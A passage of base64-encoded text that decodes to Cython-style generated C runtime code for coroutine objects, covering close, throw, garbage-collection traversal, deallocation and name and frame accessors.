WN0ICoqcmV0dmFsKSB7XG4gICAgX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4gPSAoX19weXhfQ29yb3V0aW5lT2JqZWN0ICopIHNlbGY7XG4gICAgX19QeXhfUHlTZW5kUmVzdWx0IHJlc3VsdDtcbiAgICBQeU9iamVjdCAqeWY7XG4gICAgaW50IGVyciA9IDA7XG4gICAgaWYgKHVubGlrZWx5KF9fUHl4X0Nvcm91dGluZV90ZXN0X2FuZF9zZXRfaXNfcnVubmluZyhnZW4pKSkge1xuICAgICAgICAqcmV0dmFsID0gX19QeXhfQ29yb3V0aW5lX0FscmVhZHlSdW5uaW5nRXJyb3IoZ2VuKTtcbiAgICAgICAgcmV0dXJuIFBZR0VOX0VSUk9SO1xuICAgIH1cbiAgICB5ZiA9IGdlbi0+eWllbGRmcm9tO1xuICAgIGlmICh5Zikge1xuICAgICAgICBQeV9JTkNSRUYoeWYpO1xuICAgICAgICBlcnIgPSBfX1B5eF9Db3JvdXRpbmVfQ2xvc2VJdGVyKGdlbiwgeWYpO1xuICAgICAgICBfX1B5eF9Db3JvdXRpbmVfVW5kZWxlZ2F0ZShnZW4pO1xuICAgICAgICBQeV9ERUNSRUYoeWYpO1xuICAgIH1cbiAgICBpZiAoZXJyID09IDApXG4gICAgICAgIFB5RXJyX1NldE5vbmUoUHlFeGNfR2VuZXJhdG9yRXhpdCk7XG4gICAgcmVzdWx0ID0gX19QeXhfQ29yb3V0aW5lX1NlbmRFeChnZW4sIE5VTEwsIHJldHZhbCwgMSk7XG4gICAgaWYgKHJlc3VsdCA9PSBQWUdFTl9FUlJPUikge1xuICAgICAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmVcbiAgICAgICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ25cbiAgICAgICAgX19QeXhfQ29yb3V0aW5lX3Vuc2V0X2lzX3J1bm5pbmcoZ2VuKTtcbiAgICAgICAgaWYgKCFfX1B5eF9QeUVycl9PY2N1cnJlZCgpKSB7XG4gICAgICAgICAgICByZXR1cm4gUFlHRU5fUkVUVVJOO1xuICAgICAgICB9IGVsc2UgaWYgKGxpa2VseShfX1B5eF9QeUVycl9FeGNlcHRpb25NYXRjaGVzMihQeUV4Y19HZW5lcmF0b3JFeGl0LCBQeUV4Y19TdG9wSXRlcmF0aW9uKSkpIHtcbiAgICAgICAgICAgIF9fUHl4X1B5RXJyX0NsZWFyKCk7XG4gICAgICAgICAgICByZXR1cm4gUFlHRU5fUkVUVVJOO1xuICAgICAgICB9XG4gICAgICAgIHJldHVybiBQWUdFTl9FUlJPUjtcbiAgICB9IGVsc2UgaWYgKGxpa2VseShyZXN1bHQgPT0gUFlHRU5fUkVUVVJOICYmICpyZXR2YWwgPT0gUHlfTm9uZSkpIHtcbiAgICAgICAgX19QeXhfQ29yb3V0aW5lX3Vuc2V0X2lzX3J1bm5pbmcoZ2VuKTtcbiAgICAgICAgcmV0dXJuIFBZR0VOX1JFVFVSTjtcbiAgICB9IGVsc2Uge1xuICAgICAgICBjb25zdCBjaGFyICptc2c7XG4gICAgICAgIFB5X0RFQ1JFRigqcmV0dmFsKTtcbiAgICAgICAgKnJldHZhbCA9IE5VTEw7XG4gICAgICAgIGlmICgoMCkpIHtcbiAgICAgICAgI2lmZGVmIF9fUHl4X0Nvcm91dGluZV9VU0VEXG4gICAgICAgIH0gZWxzZSBpZiAoX19QeXhfQ29yb3V0aW5lX0NoZWNrKHNlbGYpKSB7XG4gICAgICAgICAgICBtc2cgPSAiY29yb3V0aW5lIGlnbm9yZWQgR2VuZXJhdG9yRXhpdCI7XG4gICAgICAgICNlbmRpZlxuICAgICAgICAjaWZkZWYgX19QeXhfQXN5bmNHZW5fVVNFRFxuICAgICAgICB9IGVsc2UgaWYgKF9fUHl4X0FzeW5jR2VuX0NoZWNrRXhhY3Qoc2VsZikpIHtcbiAgICAgICAgICAgIG1zZyA9ICJhc3luYyBnZW5lcmF0b3IgaWdub3JlZCBHZW5lcmF0b3JFeGl0IjtcbiAgICAgICAgI2VuZGlmXG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICBtc2cgPSAiZ2VuZXJhdG9yIGlnbm9yZWQgR2VuZXJhdG9yRXhpdCI7XG4gICAgICAgIH1cbiAgICAgICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX1J1bnRpbWVFcnJvciwgbXNnKTtcbiAgICAgICAgX19QeXhfQ29yb3V0aW5lX3Vuc2V0X2lzX3J1bm5pbmcoZ2VuKTtcbiAgICAgICAgcmV0dXJuIFBZR0VOX0VSUk9SO1xuICAgIH1cbn1cbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfX0Nvcm91dGluZV9UaHJvdyhQeU9iamVjdCAqc2VsZiwgUHlPYmplY3QgKnR5cCwgUHlPYmplY3QgKnZhbCwgUHlPYmplY3QgKnRiLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFB5T2JqZWN0ICphcmdzLCBpbnQgY2xvc2Vfb25fZ2VuZXhpdCkge1xuICAgIF9fcHl4X0Nvcm91dGluZU9iamVjdCAqZ2VuID0gKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqKSBzZWxmO1xuICAgIFB5T2JqZWN0ICp5ZjtcbiAgICBpZiAodW5saWtlbHkoX19QeXhfQ29yb3V0aW5lX3Rlc3RfYW5kX3NldF9pc19ydW5uaW5nKGdlbikpKVxuICAgICAgICByZXR1cm4gX19QeXhfQ29yb3V0aW5lX0FscmVhZHlSdW5uaW5nRXJyb3IoZ2VuKTtcbiAgICB5ZiA9IGdlbi0+eWllbGRmcm9tO1xuICAgIGlmICh5Zikge1xuICAgICAgICBfX1B5eF9QeVNlbmRSZXN1bHQgcmVzdWx0O1xuICAgICAgICBQeU9iamVjdCAqcmV0O1xuICAgICAgICBQeV9JTkNSRUYoeWYpO1xuICAgICAgICBpZiAoX19QeXhfUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzKHR5cCwgUHlFeGNfR2VuZXJhdG9yRXhpdCkgJiYgY2xvc2Vfb25fZ2VuZXhpdCkge1xuICAgICAgICAgICAgaW50IGVyciA9IF9fUHl4X0Nvcm91dGluZV9DbG9zZUl0ZXIoZ2VuLCB5Zik7XG4gICAgICAgICAgICBQeV9ERUNSRUYoeWYpO1xuICAgICAgICAgICAgX19QeXhfQ29yb3V0aW5lX1VuZGVsZWdhdGUoZ2VuKTtcbiAgICAgICAgICAgIGlmIChlcnIgPCAwKVxuICAgICAgICAgICAgICAgIGdvdG8gcHJvcGFnYXRlX2V4Y2VwdGlvbjtcbiAgICAgICAgICAgIGdvdG8gdGhyb3dfaGVyZTtcbiAgICAgICAgfVxuICAgICAgICBpZiAoMFxuICAgICAgICAjaWZkZWYgX19QeXhfR2VuZXJhdG9yX1VTRURcbiAgICAgICAgICAgIHx8IF9fUHl4X0dlbmVyYXRvcl9DaGVja0V4YWN0KHlmKVxuICAgICAgICAjZW5kaWZcbiAgICAgICAgI2lmZGVmIF9fUHl4X0Nvcm91dGluZV9VU0VEXG4gICAgICAgICAgICB8fCBfX1B5eF9Db3JvdXRpbmVfQ2hlY2soeWYpXG4gICAgICAgICNlbmRpZlxuICAgICAgICAgICAgKSB7XG4gICAgICAgICAgICByZXQgPSBfX1B5eF9fQ29yb3V0aW5lX1Rocm93KHlmLCB0eXAsIHZhbCwgdGIsIGFyZ3MsIGNsb3NlX29uX2dlbmV4aXQpO1xuICAgICAgICAjaWZkZWYgX19QeXhfQ29yb3V0aW5lX1VTRURcbiAgICAgICAgfSBlbHNlIGlmIChfX1B5eF9Db3JvdXRpbmVBd2FpdF9DaGVja0V4YWN0KHlmKSkge1xuICAgICAgICAgICAgcmV0ID0gX19QeXhfX0Nvcm91dGluZV9UaHJvdygoKF9fcHl4X0Nvcm91dGluZUF3YWl0T2JqZWN0Kil5ZiktPmNvcm91dGluZSwgdHlwLCB2YWwsIHRiLCBhcmdzLCBjbG9zZV9vbl9nZW5leGl0KTtcbiAgICAgICAgI2VuZGlmXG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICBQeU9iamVjdCAqbWV0aCA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHJOb0Vycm9yKHlmLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdGhyb3cpO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFtZXRoKSkge1xuICAgICAgICAgICAgICAgIFB5X0RFQ1JFRih5Zik7XG4gICAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KFB5RXJyX09jY3VycmVkKCkpKSB7XG4gICAgICAgICAgICAgICAgICAgIF9fUHl4X0Nvcm91dGluZV91bnNldF9pc19ydW5uaW5nKGdlbik7XG4gICAgICAgICAgICAgICAgICAgIHJldHVybiBOVUxMO1xuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICBfX1B5eF9Db3JvdXRpbmVfVW5kZWxlZ2F0ZShnZW4pO1xuICAgICAgICAgICAgICAgIGdvdG8gdGhyb3dfaGVyZTtcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIGlmIChsaWtlbHkoYXJncykpIHtcbiAgICAgICAgICAgICAgICByZXQgPSBfX1B5eF9QeU9iamVjdF9DYWxsKG1ldGgsIGFyZ3MsIE5VTEwpO1xuICAgICAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgICAgICBQeU9iamVjdCAqY2FyZ3NbNF0gPSB7TlVMTCwgdHlwLCB2YWwsIHRifTtcbiAgICAgICAgICAgICAgICByZXQgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChtZXRoLCBjYXJncysxLCAzIHwgX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKTtcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIFB5X0RFQ1JFRihtZXRoKTtcbiAgICAgICAgfVxuICAgICAgICBQeV9ERUNSRUYoeWYpO1xuICAgICAgICBpZiAocmV0KSB7XG4gICAgICAgICAgICBfX1B5eF9Db3JvdXRpbmVfdW5zZXRfaXNfcnVubmluZyhnZW4pO1xuICAgICAgICAgICAgcmV0dXJuIHJldDtcbiAgICAgICAgfVxuICAgICAgICByZXN1bHQgPSBfX1B5eF9Db3JvdXRpbmVfRmluaXNoRGVsZWdhdGlvbihnZW4sICZyZXQpO1xuICAgICAgICBfX1B5eF9Db3JvdXRpbmVfdW5zZXRfaXNfcnVubmluZyhnZW4pO1xuICAgICAgICByZXR1cm4gX19QeXhfQ29yb3V0aW5lX01ldGhvZFJldHVybkZyb21SZXN1bHQoc2VsZiwgcmVzdWx0LCByZXQsIDApO1xuICAgIH1cbnRocm93X2hlcmU6XG4gICAgX19QeXhfUmFpc2UodHlwLCB2YWwsIHRiLCBOVUxMKTtcbnByb3BhZ2F0ZV9leGNlcHRpb246XG4gICAge1xuICAgICAgICBQeU9iamVjdCAqcmV0dmFsID0gTlVMTDtcbiAgICAgICAgX19QeXhfUHlTZW5kUmVzdWx0IHJlc3VsdCA9IF9fUHl4X0Nvcm91dGluZV9TZW5kRXgoZ2VuLCBOVUxMLCAmcmV0dmFsLCAwKTtcbiAgICAgICAgX19QeXhfQ29yb3V0aW5lX3Vuc2V0X2lzX3J1bm5pbmcoZ2VuKTtcbiAgICAgICAgcmV0dXJuIF9fUHl4X0Nvcm91dGluZV9NZXRob2RSZXR1cm5Gcm9tUmVzdWx0KHNlbGYsIHJlc3VsdCwgcmV0dmFsLCAwKTtcbiAgICB9XG59XG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X0Nvcm91dGluZV9UaHJvdyhQeU9iamVjdCAqc2VsZiwgUHlPYmplY3QgKmFyZ3MpIHtcbiAgICBQeU9iamVjdCAqdHlwO1xuICAgIFB5T2JqZWN0ICp2YWwgPSBOVUxMO1xuICAgIFB5T2JqZWN0ICp0YiA9IE5VTEw7XG4gICAgaWYgKHVubGlrZWx5KCFQeUFyZ19VbnBhY2tUdXBsZShhcmdzLCAidGhyb3ciLCAxLCAzLCAmdHlwLCAmdmFsLCAmdGIpKSlcbiAgICAgICAgcmV0dXJuIE5VTEw7XG4gICAgcmV0dXJuIF9fUHl4X19Db3JvdXRpbmVfVGhyb3coc2VsZiwgdHlwLCB2YWwsIHRiLCBhcmdzLCAxKTtcbn1cbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9Db3JvdXRpbmVfdHJhdmVyc2VfZXhjc3RhdGUoX19QeXhfRXhjSW5mb1N0cnVjdCAqZXhjX3N0YXRlLCB2aXNpdHByb2MgdmlzaXQsIHZvaWQgKmFyZykge1xuI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQjAwYTRcbiAgICBQeV9WSVNJVChleGNfc3RhdGUtPmV4Y192YWx1ZSk7XG4jZWxzZVxuICAgIFB5X1ZJU0lUKGV4Y19zdGF0ZS0+ZXhjX3R5cGUpO1xuICAgIFB5X1ZJU0lUKGV4Y19zdGF0ZS0+ZXhjX3ZhbHVlKTtcbiAgICBQeV9WSVNJVChleGNfc3RhdGUtPmV4Y190cmFjZWJhY2spO1xuI2VuZGlmXG4gICAgcmV0dXJuIDA7XG59XG5zdGF0aWMgaW50IF9fUHl4X0Nvcm91dGluZV90cmF2ZXJzZShfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbiwgdmlzaXRwcm9jIHZpc2l0LCB2b2lkICphcmcpIHtcbiAgICB7XG4gICAgICAgIGludCBlID0gX19QeXhfY2FsbF90eXBlX3RyYXZlcnNlKChQeU9iamVjdCopZ2VuLCAxLCB2aXNpdCwgYXJnKTtcbiAgICAgICAgaWYgKGUpIHJldHVybiBlO1xuICAgIH1cbiAgICBQeV9WSVNJVChnZW4tPmNsb3N1cmUpO1xuICAgIFB5X1ZJU0lUKGdlbi0+Y2xhc3NvYmopO1xuICAgIFB5X1ZJU0lUKGdlbi0+eWllbGRmcm9tKTtcbiAgICByZXR1cm4gX19QeXhfQ29yb3V0aW5lX3RyYXZlcnNlX2V4Y3N0YXRlKCZnZW4tPmdpX2V4Y19zdGF0ZSwgdmlzaXQsIGFyZyk7XG59XG5zdGF0aWMgaW50IF9fUHl4X0Nvcm91dGluZV9jbGVhcihQeU9iamVjdCAqc2VsZikge1xuICAgIF9fcHl4X0Nvcm91dGluZU9iamVjdCAqZ2VuID0gKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqKSBzZWxmO1xuICAgIFB5X0NMRUFSKGdlbi0+Y2xvc3VyZSk7XG4gICAgUHlfQ0xFQVIoZ2VuLT5jbGFzc29iaik7XG4gICAgX19QeXhfQ29yb3V0aW5lX1VuZGVsZWdhdGUoZ2VuKTtcbiAgICBfX1B5eF9Db3JvdXRpbmVfRXhjZXB0aW9uQ2xlYXIoJmdlbi0+Z2lfZXhjX3N0YXRlKTtcbiNpZmRlZiBfX1B5eF9Bc3luY0dlbl9VU0VEXG4gICAgaWYgKF9fUHl4X0FzeW5jR2VuX0NoZWNrRXhhY3Qoc2VsZikpIHtcbiAgICAgICAgUHlfQ0xFQVIoKChfX3B5eF9QeUFzeW5jR2VuT2JqZWN0KilnZW4pLT5hZ19maW5hbGl6ZXIpO1xuICAgIH1cbiNlbmRpZlxuICAgIFB5X0NMRUFSKGdlbi0+Z2lfY29kZSk7XG4gICAgUHlfQ0xFQVIoZ2VuLT5naV9mcmFtZSk7XG4gICAgUHlfQ0xFQVIoZ2VuLT5naV9uYW1lKTtcbiAgICBQeV9DTEVBUihnZW4tPmdpX3F1YWxuYW1lKTtcbiAgICBQeV9DTEVBUihnZW4tPmdpX21vZHVsZW5hbWUpO1xuICAgIHJldHVybiAwO1xufVxuc3RhdGljIHZvaWQgX19QeXhfQ29yb3V0aW5lX2RlYWxsb2MoUHlPYmplY3QgKnNlbGYpIHtcbiAgICBfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbiA9IChfX3B5eF9Db3JvdXRpbmVPYmplY3QgKikgc2VsZjtcbiAgICBQeU9iamVjdF9HQ19VblRyYWNrKGdlbik7XG4gICAgaWYgKGdlbi0+Z2lfd2Vha3JlZmxpc3QgIT0gTlVMTClcbiAgICAgICAgUHlPYmplY3RfQ2xlYXJXZWFrUmVmcyhzZWxmKTtcbiAgICBpZiAoZ2VuLT5yZXN1bWVfbGFiZWwgPj0gMCkge1xuICAgICAgICBQeU9iamVjdF9HQ19UcmFjayhzZWxmKTtcbiNpZiBDWVRIT05fVVNFX1RQX0ZJTkFMSVpFXG4gICAgICAgIGlmICh1bmxpa2VseShQeU9iamVjdF9DYWxsRmluYWxpemVyRnJvbURlYWxsb2Moc2VsZikpKVxuI2Vsc2VcbiAgICAgICAge1xuICAgICAgICAgICAgZGVzdHJ1Y3RvciBkZWwgPSBfX1B5eF9QeU9iamVjdF9HZXRTbG90KGdlbiwgdHBfZGVsLCBkZXN0cnVjdG9yKTtcbiAgICAgICAgICAgIGlmIChkZWwpIGRlbChzZWxmKTtcbiAgICAgICAgfVxuICAgICAgICBpZiAodW5saWtlbHkoUHlfUkVGQ05UKHNlbGYpID4gMCkpXG4jZW5kaWZcbiAgICAgICAge1xuICAgICAgICAgICAgcmV0dXJuO1xuICAgICAgICB9XG4gICAgICAgIFB5T2JqZWN0X0dDX1VuVHJhY2soc2VsZik7XG4gICAgfVxuI2lmZGVmIF9fUHl4X0FzeW5jR2VuX1VTRURcbiAgICBpZiAoX19QeXhfQXN5bmNHZW5fQ2hlY2tFeGFjdChzZWxmKSkge1xuICAgICAgICBcbiAgICAgICAgUHlfQ0xFQVIoKChfX3B5eF9QeUFzeW5jR2VuT2JqZWN0KilzZWxmKS0+YWdfZmluYWxpemVyKTtcbiAgICB9XG4jZW5kaWZcbiAgICBfX1B5eF9Db3JvdXRpbmVfY2xlYXIoc2VsZik7XG4gICAgX19QeXhfUHlIZWFwVHlwZU9iamVjdF9HQ19EZWwoZ2VuKTtcbn1cbiNpZiBDWVRIT05fVVNFX1RQX0ZJTkFMSVpFXG5zdGF0aWMgdm9pZCBfX1B5eF9Db3JvdXRpbmVfZGVsKFB5T2JqZWN0ICpzZWxmKSB7XG4gICAgUHlPYmplY3QgKmVycm9yX3R5cGUsICplcnJvcl92YWx1ZSwgKmVycm9yX3RyYWNlYmFjaztcbiAgICBfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbiA9IChfX3B5eF9Db3JvdXRpbmVPYmplY3QgKikgc2VsZjtcbiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmVcbiAgICBpZiAoZ2VuLT5yZXN1bWVfbGFiZWwgPCAwKSB7XG4gICAgICAgIHJldHVybjtcbiAgICB9XG4gICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ25cbiAgICBfX1B5eF9FcnJGZXRjaCgmZXJyb3JfdHlwZSwgJmVycm9yX3ZhbHVlLCAmZXJyb3JfdHJhY2ViYWNrKTtcbiNpZmRlZiBfX1B5eF9Bc3luY0dlbl9VU0VEXG4gICAgaWYgKF9fUHl4X0FzeW5jR2VuX0NoZWNrRXhhY3Qoc2VsZikpIHtcbiAgICAgICAgX19weXhfUHlBc3luY0dlbk9iamVjdCAqYWdlbiA9IChfX3B5eF9QeUFzeW5jR2VuT2JqZWN0KilzZWxmO1xuICAgICAgICBQeU9iamVjdCAqZmluYWxpemVyID0gYWdlbi0+YWdfZmluYWxpemVyO1xuICAgICAgICBpZiAoZmluYWxpemVyICYmICFhZ2VuLT5hZ19jbG9zZWQpIHtcbiAgICAgICAgICAgIFB5T2JqZWN0ICpyZXMgPSBfX1B5eF9QeU9iamVjdF9DYWxsT25lQXJnKGZpbmFsaXplciwgc2VsZik7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoIXJlcykpIHtcbiAgICAgICAgICAgICAgICBQeUVycl9Xcml0ZVVucmFpc2FibGUoc2VsZik7XG4gICAgICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgICAgIFB5X0RFQ1JFRihyZXMpO1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgX19QeXhfRXJyUmVzdG9yZShlcnJvcl90eXBlLCBlcnJvcl92YWx1ZSwgZXJyb3JfdHJhY2ViYWNrKTtcbiAgICAgICAgICAgIHJldHVybjtcbiAgICAgICAgfVxuICAgIH1cbiNlbmRpZlxuICAgIGlmICh1bmxpa2VseShnZW4tPnJlc3VtZV9sYWJlbCA9PSAwICYmICFlcnJvcl92YWx1ZSkpIHtcbiNpZmRlZiBfX1B5eF9Db3JvdXRpbmVfVVNFRFxuI2lmZGVmIF9fUHl4X0dlbmVyYXRvcl9VU0VEXG4gICAgaWYgKCFfX1B5eF9HZW5lcmF0b3JfQ2hlY2tFeGFjdChzZWxmKSlcbiNlbmRpZlxuICAgICAgICB7XG4gICAgICAgIFB5T2JqZWN0X0dDX1VuVHJhY2soc2VsZik7XG4gICAgICAgIGlmICh1bmxpa2VseShQeUVycl9XYXJuRm9ybWF0KFB5RXhjX1J1bnRpbWVXYXJuaW5nLCAxLCAiY29yb3V0aW5lIFwnJS41MFNcJyB3YXMgbmV2ZXIgYXdhaXRlZCIsIGdlbi0+Z2lfcXVhbG5hbWUpIDwgMCkpXG4gICAgICAgICAgICBQeUVycl9Xcml0ZVVucmFpc2FibGUoc2VsZik7XG4gICAgICAgIFB5T2JqZWN0X0dDX1RyYWNrKHNlbGYpO1xuICAgICAgICB9XG4jZW5kaWZcbiAgICB9IGVsc2Uge1xuICAgICAgICBQeU9iamVjdCAqcmV0dmFsID0gTlVMTDtcbiAgICAgICAgX19QeXhfUHlTZW5kUmVzdWx0IHJlc3VsdCA9IF9fUHl4X0Nvcm91dGluZV9DbG9zZShzZWxmLCAmcmV0dmFsKTtcbiAgICAgICAgaWYgKHJlc3VsdCA9PSBQWUdFTl9FUlJPUikge1xuICAgICAgICAgICAgUHlFcnJfV3JpdGVVbnJhaXNhYmxlKHNlbGYpO1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgUHlfWERFQ1JFRihyZXR2YWwpO1xuICAgICAgICB9XG4gICAgfVxuICAgIF9fUHl4X0VyclJlc3RvcmUoZXJyb3JfdHlwZSwgZXJyb3JfdmFsdWUsIGVycm9yX3RyYWNlYmFjayk7XG59XG4jZW5kaWZcbnN0YXRpYyBQeU9iamVjdCAqXG5fX1B5eF9Db3JvdXRpbmVfZ2V0X25hbWUoX19weXhfQ29yb3V0aW5lT2JqZWN0ICpzZWxmLCB2b2lkICpjb250ZXh0KVxue1xuICAgIFB5T2JqZWN0ICpuYW1lID0gc2VsZi0+Z2lfbmFtZTtcbiAgICBDWVRIT05fVU5VU0VEX1ZBUihjb250ZXh0KTtcbiAgICBpZiAodW5saWtlbHkoIW5hbWUpKSBuYW1lID0gUHlfTm9uZTtcbiAgICBQeV9JTkNSRUYobmFtZSk7XG4gICAgcmV0dXJuIG5hbWU7XG59XG5zdGF0aWMgaW50XG5fX1B5eF9Db3JvdXRpbmVfc2V0X25hbWUoX19weXhfQ29yb3V0aW5lT2JqZWN0ICpzZWxmLCBQeU9iamVjdCAqdmFsdWUsIHZvaWQgKmNvbnRleHQpXG57XG4gICAgQ1lUSE9OX1VOVVNFRF9WQVIoY29udGV4dCk7XG4gICAgaWYgKHVubGlrZWx5KHZhbHVlID09IE5VTEwgfHwgIVB5VW5pY29kZV9DaGVjayh2YWx1ZSkpKSB7XG4gICAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19UeXBlRXJyb3IsXG4gICAgICAgICAgICAgICAgICAgICAgICAiX19uYW1lX18gbXVzdCBiZSBzZXQgdG8gYSBzdHJpbmcgb2JqZWN0Iik7XG4gICAgICAgIHJldHVybiAtMTtcbiAgICB9XG4gICAgUHlfSU5DUkVGKHZhbHVlKTtcbiAgICBfX1B5eF9QeV9YREVDUkVGX1NFVChzZWxmLT5naV9uYW1lLCB2YWx1ZSk7XG4gICAgcmV0dXJuIDA7XG59XG5zdGF0aWMgUHlPYmplY3QgKlxuX19QeXhfQ29yb3V0aW5lX2dldF9xdWFsbmFtZShfX3B5eF9Db3JvdXRpbmVPYmplY3QgKnNlbGYsIHZvaWQgKmNvbnRleHQpXG57XG4gICAgUHlPYmplY3QgKm5hbWUgPSBzZWxmLT5naV9xdWFsbmFtZTtcbiAgICBDWVRIT05fVU5VU0VEX1ZBUihjb250ZXh0KTtcbiAgICBpZiAodW5saWtlbHkoIW5hbWUpKSBuYW1lID0gUHlfTm9uZTtcbiAgICBQeV9JTkNSRUYobmFtZSk7XG4gICAgcmV0dXJuIG5hbWU7XG59XG5zdGF0aWMgaW50XG5fX1B5eF9Db3JvdXRpbmVfc2V0X3F1YWxuYW1lKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqc2VsZiwgUHlPYmplY3QgKnZhbHVlLCB2b2lkICpjb250ZXh0KVxue1xuICAgIENZVEhPTl9VTlVTRURfVkFSKGNvbnRleHQpO1xuICAgIGlmICh1bmxpa2VseSh2YWx1ZSA9PSBOVUxMIHx8ICFQeVVuaWNvZGVfQ2hlY2sodmFsdWUpKSkge1xuICAgICAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfVHlwZUVycm9yLFxuICAgICAgICAgICAgICAgICAgICAgICAgIl9fcXVhbG5hbWVfXyBtdXN0IGJlIHNldCB0byBhIHN0cmluZyBvYmplY3QiKTtcbiAgICAgICAgcmV0dXJuIC0xO1xuICAgIH1cbiAgICBQeV9JTkNSRUYodmFsdWUpO1xuICAgIF9fUHl4X1B5X1hERUNSRUZfU0VUKHNlbGYtPmdpX3F1YWxuYW1lLCB2YWx1ZSk7XG4gICAgcmV0dXJuIDA7XG59XG5zdGF0aWMgUHlPYmplY3QgKlxuX19QeXhfX0Nvcm91dGluZV9nZXRfZnJhbWUoX19weXhfQ29yb3V0aW5lT2JqZWN0ICpzZWxmKVxue1xuI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgUHlPYmplY3QgKmZyYW1lO1xuICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMDAwXG4gICAgUHlfQkVHSU5fQ1JJVElDQUxfU0VDVElPTihzZWxmKTtcbiAgICAjZW5kaWZcbiAgICBmcmFtZSA9IHNlbGYtPmdpX2ZyYW1lO1xuICAgIGlmICghZnJhbWUpIHtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFzZWxmLT5naV9jb2RlKSkge1xuICAgICAgICAgICAgUHlfUkVUVVJOX05PTkU7XG4gICAgICAgIH1cbiAgICAgICAgUHlPYmplY3QgKmdsb2JhbHMgPSBQeURpY3RfTmV3KCk7XG4gICAgICAgIGlmICh1bmxpa2VseSghZ2xvYmFscykpIHJldHVybiBOVUxMO1xuICAgICAgICBmcmFtZSA9IChQeU9iamVjdCAqKSBQeUZyYW1lX05ldyhcbiAgICAgICAgICAgIFB5VGhyZWFkU3RhdGVfR2V0KCksICAgICAgICAgICAgXG4gICAgICAgICAgICAoUHlDb2RlT2JqZWN0Kikgc2VsZi0+Z2lfY29kZSwgIFxuICAgICAgICAgICAgZ2xvYmFscywgICAgICAgICAgICAgICAgICAgICAgICBcbiAgICAgICAgICAgIDAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXG4gICAgICAgICk7XG4gICAgICAgIFB5X0RFQ1JFRihnbG9iYWxzKTtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFmcmFtZSkpXG4gICAgICAgICAgICByZXR1cm4gTlVMTDtcbiAgICAgICAgaWYgKHVubGlrZWx5KHNlbGYtPmdpX2ZyYW1lKSkge1xuICAgICAgICAgICAgUHlfREVDUkVGKGZyYW1lKTtcbiAgICAgICAgICAgIGZyYW1lID0gc2VsZi0+Z2lfZnJhbWU7XG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICBzZWxmLT5naV9mcmFtZSA9IGZyYW1lO1xuICAgICAgICB9XG4gICAgfVxuICAgIFB5X0lOQ1JFRihmcmFtZSk7XG4gICAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwMDBcbiAgICBQeV9FTkRfQ1JJVElDQUxfU0VDVElPTigpO1xuICAgICNlbmRpZlxuICAgIHJldHVybiBmcmFtZTtcbiNlbHNlXG4gICAgQ1lUSE9OX1VOVVNFRF9WQVIoc2VsZik7XG4gICAgUHlfUkVUVVJOX05PTkU7XG4jZW5kaWZcbn1cbnN0YXRpYyBQeU9iamVjdCAqXG5fX1B5eF9Db3JvdXRpbmVfZ2V0X2ZyYW1lKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqc2VsZiwgdm9pZCAqY29udGV4dCkge1xuICAgIENZVEhPTl9VTlVTRURfVkFSKGNvbnRleHQpO1xuICAgIFB5T2JqZWN0ICpmcmFtZSA9IHNlbGYtPmdpX2ZyYW1lO1xuICAgIGlmIChmcmFtZSlcbiAgICAgICAgcmV0dXJuIF9fUHl4X05ld1JlZihmcmFtZSk7XG4gICAgcmV0dXJuIF9fUHl4X19Db3JvdXRpbmVfZ2V0X2ZyYW1lKHNlbGYpO1xufVxuc3RhdGljIF9fcHl4X0Nvcm91dGluZU9iamVjdCAqX19QeXhfX0Nvcm91dGluZV9OZXcoXG4gICAgICAgICAgICBQeVR5cGVPYmplY3QqIHR5cGUsIF9fcHl4X2Nvcm91dGluZV9ib2R5X3QgYm9keSwgUHlPYmplY3QgKmNvZGUsIFB5T2JqZWN0ICpjbG9zdXJlLFxuICAgICAgICAgICAgUHlPYmplY3QgKm5hbWUsIFB5T2JqZWN0ICpxdWFsbmFtZSwgUHlPYmplY3QgKm1vZHVsZV9uYW1lKSB7XG4gICAgX19weXhfQ29yb3V